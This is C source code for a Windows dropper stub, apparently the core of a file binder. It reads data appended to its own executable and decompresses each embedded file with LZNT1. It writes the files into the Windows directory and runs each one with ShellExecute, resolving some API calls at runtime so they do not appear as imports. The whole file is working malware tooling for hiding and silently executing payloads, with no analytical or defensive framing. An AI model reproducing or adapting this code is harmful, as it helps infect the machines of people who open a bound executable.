#pragma optimize("gsy", on)
#include <windows.h>
#include <commctrl.h>

typedef DWORD (WINAPI *_RtlDecompressBuffer)(IN ULONG CompressionFormat,OUT PVOID DestinationBuffer,IN ULONG DestinationBufferLength,
	IN PVOID SourceBuffer,IN ULONG SourceBufferLength,OUT PULONG pDestinationSize );

typedef DWORD (WINAPI *_RtlGetCompressionWorkSpaceSize )(IN ULONG CompressionFormat,OUT PULONG pNeededBufferSize,OUT PULONG pUnknown);

typedef VOID (WINAPI *_CopyMemory)(PVOID Destination,CONST VOID *Source,SIZE_T Length);

VOID SaveFileToDisk(LPSTR nFileName,LPSTR lpFileMaped,DWORD FileSize)
{
	DWORD Escritos;
	HANDLE hFile=CreateFile(nFileName,GENERIC_READ+GENERIC_WRITE,0,0,CREATE_ALWAYS,0,0);
	WriteFile(hFile,lpFileMaped,FileSize,&Escritos,0);
	CloseHandle(hFile);
}

LPSTR DecompressBuffer(LPSTR lpBuffer,DWORD szBuffer,LPDWORD dwSizeOut )
{
   _RtlDecompressBuffer miRtlDecompressBuffer;
   _RtlGetCompressionWorkSpaceSize miRtlGetCompressionWorkSpaceSize;
   DWORD dwRet;
   DWORD dwSize;
  
   DWORD dstSize=16*szBuffer;

   LPSTR szRet=(LPSTR)malloc(dstSize);

   miRtlDecompressBuffer=(_RtlDecompressBuffer)GetProcAddress((HINSTANCE)LoadLibraryA("NTDLL.DLL"),"RtlDecompressBuffer");
  
   miRtlGetCompressionWorkSpaceSize=(_RtlGetCompressionWorkSpaceSize)GetProcAddress((HINSTANCE)LoadLibraryA("NTDLL.DLL"),"RtlGetCompressionWorkSpaceSize");

   miRtlGetCompressionWorkSpaceSize( COMPRESSION_FORMAT_LZNT1,&dwSize,&dwRet);

   miRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,szRet,dstSize,lpBuffer,szBuffer,dwSizeOut);

   return szRet;
}

WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszCmdLine,int nCmdShow)
{
	_CopyMemory miCopyMemory=NULL;
	miCopyMemory=(_CopyMemory)GetProcAddress(GetModuleHandle("KERNEL32.DLL"),"RtlMoveMemory");

	DWORD szSubFile;
	LPSTR ext=(LPSTR)malloc(3);
	DWORD Seek=0;
	LPSTR lpFile=NULL;
	DWORD dwBytes;

	CHAR AppName[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),AppName,MAX_PATH);

	HANDLE hFile=CreateFile(AppName,GENERIC_READ,0,0,OPEN_EXISTING,0,0);
	DWORD szFile=GetFileSize(hFile,0);
	LPSTR FileBuffer=(LPSTR)malloc(szFile);
	ReadFile(hFile,FileBuffer,szFile,&dwBytes,0);
	CloseHandle(hFile);

	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INTH;
	PIMAGE_SECTION_HEADER ISH;

	IDH=(PIMAGE_DOS_HEADER)&FileBuffer[0];
	INTH=(PIMAGE_NT_HEADERS)&FileBuffer[IDH->e_lfanew];
	ISH=(PIMAGE_SECTION_HEADER)&FileBuffer[IDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+sizeof(IMAGE_SECTION_HEADER)*(INTH->FileHeader.NumberOfSections-1)];

	DWORD StubSize=ISH->PointerToRawData+ISH->SizeOfRawData;

	CHAR WinPath[MAX_PATH];
	GetWindowsDirectory(WinPath,MAX_PATH);

	DWORD NumArchivos;
	miCopyMemory(&NumArchivos,&FileBuffer[StubSize],4);

	Seek=4;
	for(DWORD i=0;i<NumArchivos;i++)
	{
		//Obtenemos el peso del archivo
		miCopyMemory(&szSubFile,&FileBuffer[StubSize+Seek],4);

		//Obtenemos la extensión
		miCopyMemory(&ext[0],&FileBuffer[StubSize+Seek+4],3);

		//Leemos el archivo
		lpFile=(LPSTR)malloc(szSubFile);
		miCopyMemory(&lpFile[0],&FileBuffer[StubSize+Seek+7],szSubFile);

		//Lo descomprimimos
		DWORD szDecompressedFile;
		LPSTR lpDecompressedFile=DecompressBuffer(lpFile,szSubFile,&szDecompressedFile);

		//Generamos la ruta
		CHAR Path[MAX_PATH];
		wsprintf(Path,"%s%s%i%s%s",WinPath,"\\",i,".",ext);

		//Lo guardamos en WinPath
		SaveFileToDisk(Path,lpDecompressedFile,szDecompressedFile);

		ShellExecute(0,0,Path,0,0,SW_SHOW);

		Seek=Seek+11+szSubFile;
	}

	return 0;
}